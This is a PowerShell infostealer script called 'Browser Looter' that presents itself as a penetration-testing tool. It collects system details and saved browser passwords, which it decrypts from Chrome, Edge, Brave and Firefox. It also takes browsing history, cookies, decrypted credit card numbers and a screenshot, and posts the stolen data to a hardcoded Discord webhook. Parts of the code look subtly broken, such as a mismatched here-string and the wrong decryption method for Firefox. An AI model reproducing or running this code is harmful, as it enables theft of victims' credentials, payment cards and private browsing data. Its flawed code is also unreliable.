# Browser Looter v2.0 - Complete Browser Data Extraction
# Author: Pentest Professional | Authorized Use Only
Write-Host "🚀 Starting Browser Data Extraction... (Visible Mode)" -ForegroundColor Green
Write-Host "📱 Sending data to Discord webhook..." -ForegroundColor Yellow

$webhook = "https://discord.com/api/webhooks/1472080084121948270/7YUi0bfxv4NRiZ7knKIvKTj_IWPrDx3OEeCrQ4P_WbKQZz9T4q2xHr6vnW5Z4EytRYlj"  # <- REPLACE THIS
$tempdir = "C:\Windows\Temp\Loot"
if (!(Test-Path $tempdir)) { New-Item -Path $tempdir -ItemType Directory | Out-Null }

function Send-Discord {
    param([string]$title, [string]$content)
    $payload = @{
        username = "Browser Looter"
        embeds = @(
            @{
                title = $title
                description = $content
                color = 16711680
                timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
            }
        )
    } | ConvertTo-Json -Depth 10
    
    try {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
        $req = [Net.WebRequest]::Create($webhook)
        $req.Method = "POST"
        $req.Headers.Add("Content-Type", "application/json")
        $req.ContentLength = $bytes.Length
        $rs = $req.GetRequestStream()
        $rs.Write($bytes, 0, $bytes.Length)
        $rs.Close()
        Write-Host "✅ $title sent to Discord" -ForegroundColor Green
    }
    catch {
        Write-Host "❌ Failed to send $title" -ForegroundColor Red
    }
}

# SYSTEM INFO
$sysinfo = @"
**🎯 TARGET INFO**
User: $env:USERNAME
Computer: $env:COMPUTERNAME 
OS: $((Get-WmiObject Win32_OperatingSystem).Caption)
Domain: $env:USERDOMAIN
SID: $((New-Object System.Security.Principal.NTAccount($env:USERNAME)).Translate([System.Security.Principal.SecurityIdentifier]).Value)
IP: $((ipconfig | findstr IPv4 | select -First 1).Split(':')[1].Trim())
"@

Send-Discord "🎯 System Recon" $sysinfo

# BROWSER PASSWORDS (Chrome/Edge/Brave/Firefox)
Write-Host "`n🔑 Extracting PASSWORDS..." -ForegroundColor Cyan
$creds = @"

**🔑 SAVED PASSWORDS**
"
$userpath = $env:USERPROFILE

$browsers = @(
    @{Name="Chrome"; Path="$userpath\AppData\Local\Google\Chrome\User Data\Default"},
    @{Name="Edge"; Path="$userpath\AppData\Local\Microsoft\Edge\User Data\Default"},
    @{Name="Brave"; Path="$userpath\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default"}
)

foreach ($browser in $browsers) {
    $login_db = $browser.Path + "\Login Data"
    if (Test-Path $login_db) {
        try {
            $conn = New-Object System.Data.OleDb.OleDbConnection("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$login_db")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT origin_url, action_url, username_value, password_value FROM logins"
            $reader = $cmd.ExecuteReader()
            
            while ($reader.Read()) {
                $url = $reader.GetString(0)
                $user = $reader.GetString(2)
                try {
                    $encrypted = $reader.GetString(3)
                    $password = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($encrypted), $null, 'CurrentUser'))
                    $creds += "**$($browser.Name)** | $url`n"
                    $creds += "👤 $user | 🔑 $password`n`n"
                }
                catch { $creds += "**$($browser.Name)** | $url | 👤 $user | 🔒 DECRYPT FAILED`n`n" }
            }
            $conn.Close()
        }
        catch { $creds += "[$($browser.Name)] Database access failed`n" }
    }
}

# FIREFOX PASSWORDS
$firefox_profiles = "$userpath\AppData\Roaming\Mozilla\Firefox\Profiles"
if (Test-Path $firefox_profiles) {
    $profile = Get-ChildItem $firefox_profiles | Sort-Object LastWriteTime -Descending | Select-Object -First 1
    $logins_json = "$($profile.FullName)\logins.json"
    if (Test-Path $logins_json) {
        $logins = Get-Content $logins_json | ConvertFrom-Json
        foreach ($login in $logins.logins) {
            try {
                $pass_bytes = [Convert]::FromBase64String($login.password)
                $password = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($pass_bytes, $null, 'CurrentUser'))
                $creds += "**Firefox** | $($login.hostname)`n"
                $creds += "👤 $($login.username) | 🔑 $password`n`n"
            }
            catch { }
        }
    }
}

Send-Discord "🔑 Credentials Harvest" $creds

# HISTORY (Top 50 per browser)
Write-Host "`n📜 Extracting HISTORY..." -ForegroundColor Cyan
$history = @"

**📜 BROWSING HISTORY (Top 50)**
"
foreach ($browser in $browsers) {
    $hist_db = $browser.Path + "\History"
    if (Test-Path $hist_db) {
        try {
            $conn = New-Object System.Data.OleDb.OleDbConnection("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$hist_db")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 50"
            $reader = $cmd.ExecuteReader()
            $history += "**$($browser.Name) History:**`n"
            while ($reader.Read()) {
                $history += "🔗 $($reader.GetString(1)) | $($reader.GetString(0))`n"
            }
            $conn.Close()
        }
        catch { }
    }
}

Send-Discord "📜 Browser History" $history

# COOKIES + CREDIT CARDS
Write-Host "`n🍪 Extracting COOKIES & CREDIT CARDS..." -ForegroundColor Cyan
$cookies_cards = @"

**🍪 COOKIES & 💳 CREDIT CARDS**
"
foreach ($browser in $browsers) {
    $cookies_db = $browser.Path + "\Network\Cookies"
    if (Test-Path $cookies_db) {
        try {
            $conn = New-Object System.Data.OleDb.OleDbConnection("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$cookies_db")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT host_key, name FROM cookies LIMIT 20"
            $reader = $cmd.ExecuteReader()
            $cookies_cards += "**$($browser.Name) Cookies (Sample):**`n"
            while ($reader.Read()) {
                $cookies_cards += "🍪 $($reader.GetString(1))@$($reader.GetString(0))`n"
            }
            $conn.Close()
        }
        catch { }
    }
    
    # Credit Cards
    $webdata = $browser.Path + "\Web Data"
    if (Test-Path $webdata) {
        try {
            $conn = New-Object System.Data.OleDb.OleDbConnection("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$webdata")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT name_on_card, card_number_encrypted FROM credit_cards"
            $reader = $cmd.ExecuteReader()
            $cookies_cards += "`n**$($browser.Name) Credit Cards:**`n"
            while ($reader.Read()) {
                try {
                    $cc = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($reader.GetString(1)), $null, 'CurrentUser'))
                    $cookies_cards += "💳 $($reader.GetString(0)) | $cc`n"
                }
                catch { }
            }
            $conn.Close()
        }
        catch { }
    }
}

Send-Discord "🍪 Cookies & 💳 Cards" $cookies_cards

# SCREENSHOT
Write-Host "`n📸 Taking screenshot..." -ForegroundColor Cyan
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
$screenshot_path = "$tempdir\screenshot.png"
$bitmap.Save($screenshot_path, [System.Drawing.Imaging.ImageFormat]::Png)
Write-Host "📸 Screenshot saved: $screenshot_path" -ForegroundColor Green

# FINAL STATUS
Write-Host "`n✅ EXTRACTION COMPLETE! Check Discord for all data." -ForegroundColor Green
Write-Host "⏰ Press any key to cleanup and exit..." -ForegroundColor Yellow
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

# Cleanup
Remove-Item "$tempdir" -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "🧹 Cleanup complete. Goodbye!" -ForegroundColor Green
